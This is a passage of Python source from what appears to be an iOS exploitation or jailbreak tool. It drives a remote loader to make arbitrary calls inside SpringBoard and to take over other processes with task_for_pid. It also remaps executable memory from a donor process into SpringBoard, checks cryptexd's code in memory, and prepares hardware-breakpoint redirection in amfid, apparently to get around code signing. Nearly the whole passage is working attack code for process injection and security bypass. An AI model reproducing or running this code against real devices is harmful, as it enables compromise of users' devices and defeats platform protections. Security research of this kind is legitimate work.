                        await read_memory(remote, thread_array_address, 8),
                    )[0]
                    thread_array = thread_array_raw & USER_VA_MASK
                    thread_count = struct.unpack(
                        "<I",
                        await read_memory(remote, thread_count_address, 4),
                    )[0]
                    if (
                        thread_array == 0
                        or thread_count == 0
                        or thread_count > 1024
                    ):
                        raise ProtocolError(
                            "task_threads returned invalid JSC inventory: "
                            f"array=0x{thread_array:x} count={thread_count}"
                        )
                    thread_ports = struct.unpack(
                        f"<{thread_count}I",
                        await read_memory(
                            remote, thread_array, thread_count * 4
                        ),
                    )
                    remote_thread = next(
                        (port for port in thread_ports if port != 0), 0
                    )
                    if remote_thread == 0:
                        raise ProtocolError(
                            "SpringBoard thread inventory contained no port"
                        )
                    state_address = scratch + THREAD_STATE_OFFSET
                    state_count_address = (
                        scratch + THREAD_STATE_COUNT_OFFSET
                    )
                    await write_memory(
                        remote,
                        state_address,
                        b"\0" * (ARM_THREAD_STATE64_COUNT * 4),
                    )
                    await write_memory(
                        remote,
                        state_count_address,
                        struct.pack("<I", ARM_THREAD_STATE64_COUNT),
                    )
                    state_result = await call_loader(
                        "thread_get_state_jsc_borrowed",
                        image_base + THREAD_GET_STATE_STUB_OFFSET,
                        (
                            remote_thread,
                            ARM_THREAD_STATE64,
                            state_address,
                            state_count_address,
                        ),
                    )
                    if state_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "borrowed SpringBoard thread state failed: "
                            f"{state_result & 0xFFFFFFFF}"
                        )
                    borrowed_pc_raw = struct.unpack(
                        "<Q",
                        await read_memory(
                            remote,
                            state_address + ARM_THREAD_STATE64_PC_OFFSET,
                            8,
                        ),
                    )[0]
                    print(
                        "thread-probe-borrowed-thread="
                        f"0x{remote_thread:x} total={thread_count} "
                        f"pc=0x{borrowed_pc_raw & USER_VA_MASK:x}"
                    )
                else:
                    await write_memory(
                        remote, remote_thread_address, b"\0" * 8
                    )
                    thread_result = await call_loader(
                        "createRemotePthread",
                        image_base + CREATE_REMOTE_PTHREAD_OFFSET,
                        (
                            target_task,
                            all_image_info,
                            remote_thread_address,
                        ),
                    )
                    if thread_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "createRemotePthread failed: "
                            f"{thread_result & 0xFFFFFFFF}"
                        )
                    remote_thread = struct.unpack(
                        "<I",
                        await read_memory(remote, remote_thread_address, 4),
                    )[0]
                    if remote_thread == 0:
                        raise ProtocolError(
                            "createRemotePthread returned a null thread port"
                        )
                    remote_thread_owned = True
                    print(
                        f"thread-probe-remote-thread=0x{remote_thread:x}"
                    )

                await write_memory(remote, call_return_address, b"\0" * 8)
                call_result = await call_loader(
                    "arbCall_getpid",
                    image_base + ARB_CALL_OFFSET,
                    (
                        target_task,
                        remote_thread,
                        call_return_address,
                        1,
                        getpid_address,
                        0,
                    ),
                )
                remote_pid = struct.unpack(
                    "<Q", await read_memory(remote, call_return_address, 8)
                )[0]
                if call_result & 0xFFFFFFFF or remote_pid != target_pid:
                    raise ProtocolError(
                        f"signed getpid call failed: mach="
                        f"{call_result & 0xFFFFFFFF} return={remote_pid}"
                    )
                print(
                    f"springboard-signed-call=success return-pid="
                    f"{remote_pid}"
                )

                if donor_mode:
                    await write_memory(
                        remote, path_address, b"\0" * PATH_BUFFER_SIZE
                    )
                    donor_path_result_raw = await call_loader(
                        "proc_pidpath_donor",
                        image_base + PROC_PIDPATH_STUB_OFFSET,
                        (
                            args.donor_pid,
                            path_address,
                            PATH_BUFFER_SIZE,
                        ),
                    )
                    donor_path_result = struct.unpack(
                        "<i",
                        struct.pack(
                            "<I", donor_path_result_raw & 0xFFFFFFFF
                        ),
                    )[0]
                    if (
                        donor_path_result <= 0
                        or donor_path_result >= PATH_BUFFER_SIZE
                    ):
                        raise ProtocolError(
                            "proc_pidpath failed for donor PID "
                            f"{args.donor_pid}: {donor_path_result}"
                        )
                    donor_path = (
                        await read_memory(
                            remote,
                            path_address,
                            donor_path_result + 1,
                        )
                    ).split(b"\0", 1)[0].decode("utf-8", "strict")
                    if not donor_path.endswith(DONOR_WORKER_SUFFIX):
                        raise ProtocolError(
                            "refusing unexpected donor executable: "
                            f"pid={args.donor_pid} path={donor_path!r}"
                        )

                    donor_task_address = (
                        scratch + DONOR_TASK_PORT_OFFSET
                    )
                    await write_memory(
                        remote, donor_task_address, b"\0" * 8
                    )
                    donor_task_result = await call_loader(
                        "task_for_pid_donor",
                        image_base + TASK_FOR_PID_STUB_OFFSET,
                        (
                            task_self,
                            args.donor_pid,
                            donor_task_address,
                        ),
                    )
                    if donor_task_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            f"task_for_pid({args.donor_pid}) failed: "
                            f"{donor_task_result & 0xFFFFFFFF}"
                        )
                    donor_task = struct.unpack(
                        "<I",
                        await read_memory(remote, donor_task_address, 4),
                    )[0]
                    if donor_task == 0:
                        raise ProtocolError(
                            "task_for_pid returned a null donor port"
                        )

                    donor_address = args.donor_address
                    if donor_address is None:
                        local_dyld_info_address = (
                            scratch + LOCAL_DYLD_INFO_OFFSET
                        )
                        local_dyld_count_address = (
                            scratch + LOCAL_DYLD_COUNT_OFFSET
                        )
                        await write_memory(
                            remote, local_dyld_info_address, b"\0" * 24
                        )
                        await write_memory(
                            remote,
                            local_dyld_count_address,
                            struct.pack("<I", TASK_DYLD_INFO_COUNT),
                        )
                        local_dyld_result = await call_loader(
                            "task_info_loader_dyld",
                            image_base + TASK_INFO_STUB_OFFSET,
                            (
                                task_self,
                                TASK_DYLD_INFO,
                                local_dyld_info_address,
                                local_dyld_count_address,
                            ),
                        )
                        if local_dyld_result & 0xFFFFFFFF:
                            raise ProtocolError(
                                "loader TASK_DYLD_INFO failed: "
                                f"{local_dyld_result & 0xFFFFFFFF}"
                            )
                        local_all_image_info = struct.unpack(
                            "<Q",
                            await read_memory(
                                remote, local_dyld_info_address, 8
                            ),
                        )[0]
                        if local_all_image_info == 0:
                            raise ProtocolError(
                                "loader TASK_DYLD_INFO returned null"
                            )

                        local_libsystem_path = (
                            b"/usr/lib/system/libsystem_kernel.dylib\0"
                        )
                        await write_memory(
                            remote, path_address, local_libsystem_path
                        )
                        local_libsystem_raw = await call_loader(
                            "getRemoteImageAddress_loader_libsystem_kernel",
                            image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                            (
                                task_self,
                                local_all_image_info,
                                path_address,
                            ),
                        )
                        local_libsystem = local_libsystem_raw & USER_VA_MASK
                        region_symbol = b"_mach_vm_region_recurse\0"
                        await write_memory(
                            remote, path_address, region_symbol
                        )
                        region_function_raw = await call_loader(
                            "remoteDlSym_loader_mach_vm_region_recurse",
                            image_base + REMOTE_DLSYM_OFFSET,
                            (
                                task_self,
                                local_libsystem,
                                path_address,
                            ),
                        )
                        region_function = (
                            region_function_raw & USER_VA_MASK
                        )
                        if local_libsystem == 0 or region_function == 0:
                            raise ProtocolError(
                                "could not resolve loader-local "
                                "mach_vm_region_recurse"
                            )

                        region_address_pointer = (
                            scratch + REGION_ADDRESS_OFFSET
                        )
                        region_size_pointer = scratch + REGION_SIZE_OFFSET
                        region_depth_pointer = (
                            scratch + REGION_DEPTH_OFFSET
                        )
                        region_info_pointer = scratch + REGION_INFO_OFFSET
                        region_count_pointer = scratch + REGION_COUNT_OFFSET
                        cursor = 0
                        depth = 0
                        regions_scanned = 0
                        candidate_pages_scanned = 0
                        matches: list[int] = []
                        for _ in range(DONOR_REGION_SCAN_LIMIT):
                            await write_memory(
                                remote,
                                region_address_pointer,
                                struct.pack("<Q", cursor),
                            )
                            await write_memory(
                                remote, region_size_pointer, b"\0" * 8
                            )
                            await write_memory(
                                remote,
                                region_depth_pointer,
                                struct.pack("<I", depth),
                            )
                            await write_memory(
                                remote,
                                region_info_pointer,
                                b"\0" * VM_REGION_SUBMAP_INFO_SIZE_64,
                            )
                            await write_memory(
                                remote,
                                region_count_pointer,
                                struct.pack(
                                    "<I",
                                    VM_REGION_SUBMAP_INFO_COUNT_64,
                                ),
                            )
                            region_result = await call_loader(
                                "mach_vm_region_recurse_donor",
                                region_function,
                                (
                                    donor_task,
                                    region_address_pointer,
                                    region_size_pointer,
                                    region_depth_pointer,
                                    region_info_pointer,
                                    region_count_pointer,
                                ),
                            )
                            region_kr = region_result & 0xFFFFFFFF
                            if region_kr == 1:
                                break
                            if region_kr != 0:
                                raise ProtocolError(
                                    "donor region scan failed: "
                                    f"{region_kr}"
                                )
                            region_address = struct.unpack(
                                "<Q",
                                await read_memory(
                                    remote, region_address_pointer, 8
                                ),
                            )[0]
                            region_size = struct.unpack(
                                "<Q",
                                await read_memory(
                                    remote, region_size_pointer, 8
                                ),
                            )[0]
                            depth = struct.unpack(
                                "<I",
                                await read_memory(
                                    remote, region_depth_pointer, 4
                                ),
                            )[0]
                            region_info = await read_memory(
                                remote,
                                region_info_pointer,
                                VM_REGION_SUBMAP_INFO_SIZE_64,
                            )
                            protection = struct.unpack_from(
                                "<i", region_info, 0
                            )[0]
                            is_submap = struct.unpack_from(
                                "<I",
                                region_info,
                                VM_REGION_SUBMAP_INFO_IS_SUBMAP_OFFSET,
                            )[0]
                            if is_submap:
                                depth += 1
                                continue
                            regions_scanned += 1
                            if (
                                region_size == 0
                                or region_address + region_size <= cursor
                            ):
                                raise ProtocolError(
                                    "donor region scan did not advance"
                                )
                            cursor = region_address + region_size
                            if (
                                protection
                                & (VM_PROT_READ | VM_PROT_EXECUTE)
                                != (VM_PROT_READ | VM_PROT_EXECUTE)
                            ):
                                continue
                            print(
                                "donor-region-rx "
                                f"address=0x{region_address:x} "
                                f"size=0x{region_size:x}"
                            )
                            if (
                                region_address
                                & (DONOR_PAGE_SIZE - 1)
                                or region_size > 0x1000000
                            ):
                                continue
                            for candidate in range(
                                region_address,
                                region_address + region_size,
                                DONOR_PAGE_SIZE,
                            ):
                                candidate_pages_scanned += 1
                                prefix_result = await call_loader(
                                    "task_read_donor_candidate",
                                    image_base + TASK_READ_OFFSET,
                                    (
                                        donor_task,
                                        candidate,
                                        path_address,
                                        len(DONOR_PROBE_PREFIX),
                                    ),
                                )
                                if prefix_result & 0xFFFFFFFF:
                                    continue
                                prefix = await read_memory(
                                    remote,
                                    path_address,
                                    len(DONOR_PROBE_PREFIX),
                                )
                                if prefix == DONOR_PROBE_PREFIX:
                                    matches.append(candidate)
                        if len(matches) != 1:
                            raise ProtocolError(
                                "expected exactly one anonymous donor page; "
                                f"found={len(matches)} "
                                f"regions={regions_scanned} "
                                f"candidatePages={candidate_pages_scanned}"
                            )
                        donor_address = matches[0]
                        print(
                            "donor-remap-address-discovery=success "
                            f"regions={regions_scanned} "
                            f"address=0x{donor_address:x}"
                        )

                    print(
                        "donor-remap-source "
                        f"pid={args.donor_pid} path={donor_path} "
                        f"address=0x{donor_address:x}"
                    )

                    donor_prefix_result = await call_loader(
                        "task_read_donor_prefix",
                        image_base + TASK_READ_OFFSET,
                        (
                            donor_task,
                            donor_address,
                            path_address,
                            len(DONOR_PROBE_PREFIX),
                        ),
                    )
                    donor_prefix = await read_memory(
                        remote, path_address, len(DONOR_PROBE_PREFIX)
                    )
                    if (
                        donor_prefix_result & 0xFFFFFFFF
                        or donor_prefix != DONOR_PROBE_PREFIX
                    ):
                        raise ProtocolError(
                            "donor page prefix did not match the fixed "
                            "low-power-loop/return-42 payload"
                        )
                    donor_validated = True
                    print("donor-remap-source-bytes=verified")

                    remap_address_pointer = (
                        scratch + DONOR_REMAP_ADDRESS_OFFSET
                    )
                    current_pointer = (
                        scratch + DONOR_CURRENT_PROTECTION_OFFSET
                    )
                    maximum_pointer = (
                        scratch + DONOR_MAXIMUM_PROTECTION_OFFSET
                    )
                    await write_memory(
                        remote, remap_address_pointer, b"\0" * 16
                    )
                    remap_result = await call_loader(
                        "mach_vm_remap_donor_to_springboard",
                        image_base + MACH_VM_REMAP_STUB_OFFSET,
                        (
                            target_task,
                            remap_address_pointer,
                            DONOR_PAGE_SIZE,
                            0,
                            VM_FLAGS_ANYWHERE,
                            donor_task,
                            donor_address,
                            0,
                            current_pointer,
                            maximum_pointer,
                            VM_INHERIT_NONE,
                        ),
                    )
                    remap_address = struct.unpack(
                        "<Q",
                        await read_memory(
                            remote, remap_address_pointer, 8
                        ),
                    )[0]
                    remap_current = struct.unpack(
                        "<i",
                        await read_memory(remote, current_pointer, 4),
                    )[0]
                    remap_maximum = struct.unpack(
                        "<i",
                        await read_memory(remote, maximum_pointer, 4),
                    )[0]
                    if remap_result & 0xFFFFFFFF:
                        raise ProtocolError(
                            "cross-process mach_vm_remap failed: "
                            f"{remap_result & 0xFFFFFFFF}"
                        )
                    if (
                        remap_address == 0
                        or remap_address & (DONOR_PAGE_SIZE - 1)
                    ):
                        raise ProtocolError(
                            "cross-process remap returned an invalid target "
                            f"address: 0x{remap_address:x}"
                        )
                    remote_allocations.append(
                        (
                            remap_address,
                            DONOR_PAGE_SIZE,
                            "donor_remap",
                        )
                    )
                    donor_remap_address = remap_address
                    print(
                        "donor-remap-protection "
                        f"address=0x{remap_address:x} "
                        f"current=0x{remap_current:x} "
                        f"maximum=0x{remap_maximum:x}"
                    )
                    if (
                        remap_current
                        & (VM_PROT_READ | VM_PROT_EXECUTE)
                    ) != (VM_PROT_READ | VM_PROT_EXECUTE):
                        raise ProtocolError(
                            "execute permission did not survive the "
                            "cross-process remap"
                        )

                    remapped_prefix_result = await call_loader(
                        "task_read_remapped_prefix",
                        image_base + TASK_READ_OFFSET,
                        (
                            target_task,
                            remap_address,
                            path_address,
                            len(DONOR_PROBE_PREFIX),
                        ),
                    )
                    remapped_prefix = await read_memory(
                        remote, path_address, len(DONOR_PROBE_PREFIX)
                    )
                    if (
                        remapped_prefix_result & 0xFFFFFFFF
                        or remapped_prefix != DONOR_PROBE_PREFIX
                    ):
                        raise ProtocolError(
                            "SpringBoard remap bytes differ from the "
                            "validated donor page"
                        )
                    print("donor-remap-target-bytes=verified")

                if (
                    args.jsc_probe is not None
                    or donor_mode
                    or amfid_mode
                    or cryptexd_mode
                ):
                    call_thread = remote_thread
                    local_string_address = scratch + LOCAL_STRING_OFFSET
                    remote_size_address = scratch + REMOTE_SIZE_OFFSET

                    async def set_local_string(value: str) -> int:
                        encoded = value.encode("utf-8") + b"\0"
                        if len(encoded) > LOCAL_STRING_SIZE:
                            raise ProtocolError(
                                f"local string is too long: {value!r}"
                            )
                        await write_memory(
                            remote, local_string_address, encoded
                        )
                        return local_string_address

                    async def write_remote_string(
                        label: str, value: str
                    ) -> int:
                        local_address = await set_local_string(value)
                        await write_memory(
                            remote, remote_size_address, b"\0" * 8
                        )
                        address_raw = await call_loader(
                            f"writeStringToTask_{label}",
                            image_base + WRITE_STRING_TO_TASK_OFFSET,
                            (
                                target_task,
                                local_address,
                                remote_size_address,
                            ),
                        )
                        address = address_raw & 0x0000FFFFFFFFFFFF
                        size = struct.unpack(
                            "<Q",
                            await read_memory(
                                remote, remote_size_address, 8
                            ),
                        )[0]
                        if address == 0 or size != len(value.encode("utf-8")) + 1:
                            raise ProtocolError(
                                f"remote string allocation failed for "
                                f"{label}: address=0x{address:x} size={size}"
                            )
                        remote_allocations.append((address, size, label))
                        return address

                    async def resolve_image_symbol(
                        label: str, image_path: str, symbol: str
                    ) -> int:
                        path_address = await set_local_string(image_path)
                        remote_image_raw = await call_loader(
                            "getRemoteImageAddress_" + label,
                            image_base + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                            (
                                target_task,
                                all_image_info,
                                path_address,
                            ),
                        )
                        remote_image = (
                            remote_image_raw & 0x0000FFFFFFFFFFFF
                        )
                        symbol_address = await set_local_string(symbol)
                        address_raw = await call_loader(
                            "remoteDlSym_" + label + "_" + symbol.lstrip("_"),
                            image_base + REMOTE_DLSYM_OFFSET,
                            (target_task, remote_image, symbol_address),
                        )
                        address = address_raw & 0x0000FFFFFFFFFFFF
                        if remote_image == 0 or address == 0:
                            raise ProtocolError(
                                f"could not resolve {symbol} in "
                                f"{image_path}"
                            )
                        return address

                    async def remote_call(
                        label: str,
                        function: int,
                        arguments: tuple[int, ...],
                    ) -> int:
                        await write_memory(
                            remote, call_return_address, b"\0" * 8
                        )
                        result = await call_loader(
                            "arbCall_" + label,
                            image_base + ARB_CALL_OFFSET,
                            (
                                target_task,
                                call_thread,
                                call_return_address,
                                1,
                                function,
                                len(arguments),
                                *arguments,
                            ),
                            variadic_stack_start=6,
                        )
                        value = struct.unpack(
                            "<Q",
                            await read_memory(
                                remote, call_return_address, 8
                            ),
                        )[0]
                        if result & 0xFFFFFFFF:
                            raise ProtocolError(
                                f"remote call {label} failed: "
                                f"{result & 0xFFFFFFFF}"
                            )
                        print(
                            f"springboard-call name={label} "
                            f"function=0x{function:x} return=0x{value:x}"
                        )
                        return value

                    async def read_target(
                        label: str, address: int, size: int
                    ) -> bytes:
                        if not (0 < size <= PATH_BUFFER_SIZE):
                            raise ProtocolError(
                                f"invalid target read size for {label}: {size}"
                            )
                        result = await call_loader(
                            "task_read_" + label,
                            image_base + TASK_READ_OFFSET,
                            (target_task, address, path_address, size),
                        )
                        if result & 0xFFFFFFFF:
                            raise ProtocolError(
                                f"target read {label} failed: "
                                f"{result & 0xFFFFFFFF}"
                            )
                        return await read_memory(
                            remote, path_address, size
                        )

                    async def write_target(
                        label: str, address: int, data: bytes
                    ) -> None:
                        if not (0 < len(data) <= PATH_BUFFER_SIZE):
                            raise ProtocolError(
                                f"invalid target write size for {label}: "
                                f"{len(data)}"
                            )
                        await write_memory(remote, path_address, data)
                        result = await call_loader(
                            "task_write_" + label,
                            image_base + TASK_WRITE_OFFSET,
                            (target_task, address, path_address, len(data)),
                        )
                        if result & 0xFFFFFFFF:
                            raise ProtocolError(
                                f"target write {label} failed: "
                                f"{result & 0xFFFFFFFF}"
                            )
                        observed = await read_target(
                            label + "_verify", address, len(data)
                        )
                        if observed != data:
                            raise ProtocolError(
                                f"target write verification failed for {label}"
                            )

                    async def inventory_target_threads(
                        label: str,
                    ) -> tuple[int, ...]:
                        thread_array_address = scratch + THREAD_ARRAY_OFFSET
                        thread_count_address = scratch + THREAD_COUNT_OFFSET
                        await write_memory(
                            remote, thread_array_address, b"\0" * 8
                        )
                        await write_memory(
                            remote, thread_count_address, b"\0" * 8
                        )
                        result = await call_loader(
                            "task_threads_" + label,
                            image_base + TASK_THREADS_STUB_OFFSET,
                            (
                                target_task,
                                thread_array_address,
                                thread_count_address,
                            ),
                        )
                        if result & 0xFFFFFFFF:
                            raise ProtocolError(
                                f"task_threads {label} failed: "
                                f"{result & 0xFFFFFFFF}"
                            )
                        array_raw = struct.unpack(
                            "<Q",
                            await read_memory(
                                remote, thread_array_address, 8
                            ),
                        )[0]
                        array = array_raw & USER_VA_MASK
                        count = struct.unpack(
                            "<I",
                            await read_memory(
                                remote, thread_count_address, 4
                            ),
                        )[0]
                        if array == 0 or count == 0 or count > 1024:
                            raise ProtocolError(
                                f"invalid thread inventory {label}: "
                                f"array=0x{array:x} count={count}"
                            )
                        ports = struct.unpack(
                            f"<{count}I",
                            await read_memory(remote, array, count * 4),
                        )
                        if any(port == 0 for port in ports):
                            raise ProtocolError(
                                f"null port in thread inventory {label}"
                            )
                        print(
                            f"springboard-thread-inventory name={label} "
                            f"count={count}"
                        )
                        return ports

                    async def target_thread_pc_and_sp(
                        label: str, thread: int
                    ) -> tuple[int, int] | None:
                        state_address = scratch + THREAD_STATE_OFFSET
                        state_count_address = (
                            scratch + THREAD_STATE_COUNT_OFFSET
                        )
                        await write_memory(
                            remote,
                            state_address,
                            b"\0" * (ARM_THREAD_STATE64_COUNT * 4),
                        )
                        await write_memory(
                            remote,
                            state_count_address,
                            struct.pack("<I", ARM_THREAD_STATE64_COUNT),
                        )
                        result = await call_loader(
                            "thread_get_state_" + label,
                            image_base + THREAD_GET_STATE_STUB_OFFSET,
                            (
                                thread,
                                ARM_THREAD_STATE64,
                                state_address,
                                state_count_address,
                            ),
                        )
                        if result & 0xFFFFFFFF:
                            return None
                        state = await read_memory(
                            remote,
                            state_address,
                            ARM_THREAD_STATE64_COUNT * 4,
                        )
                        pc_raw = struct.unpack_from(
                            "<Q",
                            state,
                            ARM_THREAD_STATE64_PC_OFFSET,
                        )[0]
                        sp_raw = struct.unpack_from(
                            "<Q",
                            state,
                            ARM_THREAD_STATE64_SP_OFFSET,
                        )[0]
                        return pc_raw, sp_raw

                    cryptexd_image_base = 0
                    if cryptexd_mode:
                        dyld_infos_prefix = await read_target(
                            "cryptexd_dyld_infos_prefix",
                            all_image_info,
                            16,
                        )
                        (
                            dyld_infos_version,
                            dyld_image_count,
                            dyld_image_array_raw,
                        ) = struct.unpack("<IIQ", dyld_infos_prefix)
                        dyld_image_array = (
                            dyld_image_array_raw & USER_VA_MASK
                        )
                        if (
                            dyld_infos_version == 0
                            or not (0 < dyld_image_count <= 4096)
                            or dyld_image_array == 0
                        ):
                            raise ProtocolError(
                                "cryptexd dyld image inventory is invalid: "
                                f"version={dyld_infos_version} "
                                f"count={dyld_image_count} "
                                f"array=0x{dyld_image_array_raw:x}"
                            )
                        first_image = await read_target(
                            "cryptexd_first_dyld_image",
                            dyld_image_array,
                            24,
                        )
                        (
                            cryptexd_image_raw,
                            cryptexd_path_raw,
                            _cryptexd_mod_date,
                        ) = struct.unpack("<QQQ", first_image)
                        cryptexd_image_base = (
                            cryptexd_image_raw & USER_VA_MASK
                        )
                        cryptexd_path_pointer = (
                            cryptexd_path_raw & USER_VA_MASK
                        )
                        if (
                            cryptexd_image_base == 0
                            or cryptexd_path_pointer == 0
                        ):
                            raise ProtocolError(
                                "cryptexd first dyld image is null"
                            )
                        cryptexd_path_bytes = await read_target(
                            "cryptexd_first_dyld_path",
                            cryptexd_path_pointer,
                            0x100,
                        )
                        cryptexd_path_end = cryptexd_path_bytes.find(b"\0")
                        if cryptexd_path_end <= 0:
                            raise ProtocolError(
                                "cryptexd first dyld path is unterminated"
                            )
                        cryptexd_dyld_path = cryptexd_path_bytes[
                            :cryptexd_path_end
                        ].decode("utf-8", "strict")
                        if cryptexd_dyld_path != CRYPTEXD_PATH:
                            raise ProtocolError(
                                "cryptexd is not the first exact dyld image: "
                                f"{cryptexd_dyld_path!r}"
                            )
                        cryptexd_header = await read_target(
                            "cryptexd_macho_header", cryptexd_image_base, 32
                        )
                        (
                            cryptexd_magic,
                            cryptexd_cpu,
                            cryptexd_subtype,
                            cryptexd_filetype,
                            cryptexd_command_count,
                            cryptexd_command_bytes,
                            _cryptexd_flags,
                            _cryptexd_reserved,
                        ) = struct.unpack("<IiiIIIII", cryptexd_header)
                        if (
                            cryptexd_magic != MH_MAGIC_64
                            or cryptexd_cpu != CPU_TYPE_ARM64
                            or (
                                cryptexd_subtype & 0x00FFFFFF
                            ) != CPU_SUBTYPE_ARM64E
                            or cryptexd_filetype != MH_EXECUTE
                            or not (
                                0
                                < cryptexd_command_count
                                <= MAX_LOAD_COMMANDS
                            )
                            or not (
                                0
                                < cryptexd_command_bytes
                                <= MAX_LOAD_COMMAND_BYTES
                            )
                        ):
                            raise ProtocolError(
                                "cryptexd in-memory Mach-O identity is invalid"
                            )
                        command_cursor = 32
                        cryptexd_observed_uuid: uuid.UUID | None = None
                        for command_index in range(cryptexd_command_count):
                            command_header = await read_target(
                                f"cryptexd_load_command_{command_index}",
                                cryptexd_image_base + command_cursor,
                                8,
                            )
                            command, command_size = struct.unpack(
                                "<II", command_header
                            )
                            if (
                                command_size < 8
                                or command_cursor + command_size
                                > 32 + cryptexd_command_bytes
                            ):
                                raise ProtocolError(
                                    "cryptexd has an invalid load command at "
                                    f"index {command_index}"
                                )
                            if command == LC_UUID:
                                if (
                                    command_size != 24
                                    or cryptexd_observed_uuid is not None
                                ):
                                    raise ProtocolError(
                                        "cryptexd has invalid UUID commands"
                                    )
                                uuid_command = await read_target(
                                    "cryptexd_uuid_command",
                                    cryptexd_image_base + command_cursor,
                                    24,
                                )
                                cryptexd_observed_uuid = uuid.UUID(
                                    bytes=uuid_command[8:24]
                                )
                            command_cursor += command_size
                        if (
                            command_cursor
                            != 32 + cryptexd_command_bytes
                            or cryptexd_observed_uuid != CRYPTEXD_UUID
                        ):
                            raise ProtocolError(
                                "cryptexd UUID/load-command validation failed: "
                                f"uuid={cryptexd_observed_uuid}"
                            )
                        for offset, expected in (
                            CRYPTEXD_EXPECTED_CODE.items()
                        ):
                            observed = await read_target(
                                f"cryptexd_code_{offset:x}",
                                cryptexd_image_base + offset,
                                len(expected),
                            )
                            if observed != expected:
                                raise ProtocolError(
                                    "cryptexd code mismatch at offset "
                                    f"0x{offset:x}: {observed.hex()}"
                                )
                        print(
                            "cryptexd-image-validation=success "
                            f"base=0x{cryptexd_image_base:x} "
                            f"uuid={cryptexd_observed_uuid} "
                            f"code-sites={len(CRYPTEXD_EXPECTED_CODE)}"
                        )

                    if amfid_mode:
                        if (
                            args.amfid_debug_state_preflight is not None
                            or args.amfid_hwbp_redirect_probe is not None
                        ):
                            local_dyld_info_address = (
                                scratch + LOCAL_DYLD_INFO_OFFSET
                            )
                            local_dyld_count_address = (
                                scratch + LOCAL_DYLD_COUNT_OFFSET
                            )
                            await write_memory(
                                remote,
                                local_dyld_info_address,
                                b"\0" * 24,
                            )
                            await write_memory(
                                remote,
                                local_dyld_count_address,
                                struct.pack("<I", TASK_DYLD_INFO_COUNT),
                            )
                            local_dyld_result = await call_loader(
                                "task_info_loader_dyld_amfid_debug",
                                image_base + TASK_INFO_STUB_OFFSET,
                                (
                                    task_self,
                                    TASK_DYLD_INFO,
                                    local_dyld_info_address,
                                    local_dyld_count_address,
                                ),
                            )
                            if local_dyld_result & 0xFFFFFFFF:
                                raise ProtocolError(
                                    "loader TASK_DYLD_INFO failed: "
                                    f"{local_dyld_result & 0xFFFFFFFF}"
                                )
                            local_all_image_info = struct.unpack(
                                "<Q",
                                await read_memory(
                                    remote, local_dyld_info_address, 8
                                ),
                            )[0]
                            if local_all_image_info == 0:
                                raise ProtocolError(
                                    "loader TASK_DYLD_INFO returned null"
                                )

                            async def resolve_debug_symbol(
                                symbol: str,
                            ) -> int:
                                local_path = await set_local_string(
                                    "/usr/lib/system/"
                                    "libsystem_kernel.dylib"
                                )
                                local_image_raw = await call_loader(
                                    "getRemoteImageAddress_loader_debug_"
                                    + symbol.lstrip("_"),
                                    image_base
                                    + GET_REMOTE_IMAGE_ADDRESS_OFFSET,
                                    (
                                        task_self,
                                        local_all_image_info,
                                        local_path,
                                    ),
                                )
                                local_image = local_image_raw & USER_VA_MASK
                                symbol_address = await set_local_string(
                                    symbol
                                )
                                result_raw = await call_loader(
                                    "remoteDlSym_loader_debug_"
                                    + symbol.lstrip("_"),
                                    image_base + REMOTE_DLSYM_OFFSET,
                                    (
                                        task_self,
                                        local_image,
                                        symbol_address,
                                    ),
                                )
                                result = result_raw & USER_VA_MASK
                                if local_image == 0 or result == 0:
                                    raise ProtocolError(
                                        "could not resolve loader-local "
                                        f"{symbol}"
                                    )
                                return result

                            task_suspend_address = (
                                await resolve_debug_symbol("_task_suspend")
                            )
                            task_resume_address = (
                                await resolve_debug_symbol("_task_resume")
                            )
                            task_get_state_address = (
                                await resolve_debug_symbol(
                                    "_task_get_state"
                                )
                            )
                            task_set_state_address = (
                                await resolve_debug_symbol(
                                    "_task_set_state"
                                )
                            )
                            thread_get_state_address = (
                                await resolve_debug_symbol(
                                    "_thread_get_state"
                                )
                            )
                            thread_set_state_address = (
                                await resolve_debug_symbol(
                                    "_thread_set_state"
                                )
                            )
                            task_get_exception_ports_address = (
                                await resolve_debug_symbol(
                                    "_task_get_exception_ports"
                                )
                            )
                            task_set_exception_ports_address = (
                                await resolve_debug_symbol(
                                    "_task_set_exception_ports"
                                )
                            )
                            mach_port_allocate_address = (
                                await resolve_debug_symbol(
                                    "_mach_port_allocate"
                                )
                            )
                            mach_port_insert_right_address = (
                                await resolve_debug_symbol(
                                    "_mach_port_insert_right"
                                )
                            )
                            mach_port_destroy_address = (
                                await resolve_debug_symbol(
                                    "_mach_port_destroy"
                                )
                            )
                            mach_msg_address = await resolve_debug_symbol(
                                "_mach_msg"
                            )
                            voucher_mach_msg_adopt_address = 0
                            voucher_mach_msg_revert_address = 0
                            if args.amfid_hwbp_redirect_probe is not None:
                                voucher_mach_msg_adopt_address = (
                                    await resolve_debug_symbol(
                                        "_voucher_mach_msg_adopt"
                                    )
                                )
                                voucher_mach_msg_revert_address = (
                                    await resolve_debug_symbol(
                                        "_voucher_mach_msg_revert"
                                    )
                                )

                            canary_cfurl_get_filesystem_representation = 0
                            canary_cfdata_get_length = 0
                            canary_cfdata_get_byte_ptr = 0
                            canary_path_buffer = 0
                            if (
                                args.amfid_hwbp_redirect_probe
                                is not None
                            ):
                                canary_cfurl_get_filesystem_representation = (
                                    await resolve_image_symbol(
                                        "amfid_canary_CFURLGetFileSystemRepresentation",
                                        "/System/Library/Frameworks/"
                                        "CoreFoundation.framework/"
                                        "CoreFoundation",
                                        "_CFURLGetFileSystemRepresentation",
                                    )
                                )
                                canary_cfdata_get_length = (
                                    await resolve_image_symbol(
                                        "amfid_canary_CFDataGetLength",
                                        "/System/Library/Frameworks/"
                                        "CoreFoundation.framework/"
                                        "CoreFoundation",
                                        "_CFDataGetLength",
                                    )
                                )
                                canary_cfdata_get_byte_ptr = (
                                    await resolve_image_symbol(
                                        "amfid_canary_CFDataGetBytePtr",
                                        "/System/Library/Frameworks/"
                                        "CoreFoundation.framework/"
                                        "CoreFoundation",
                                        "_CFDataGetBytePtr",
                                    )
                                )
                                canary_path_buffer = (
                                    await write_remote_string(
                                        "amfid_canary_path_buffer",
                                        "?" * (PATH_BUFFER_SIZE - 1),
                                    )
                                )

                            framework_path_address = await set_local_string(
                                AMFI_FRAMEWORK_PATH
                            )
                            framework_base_raw = await call_loader(
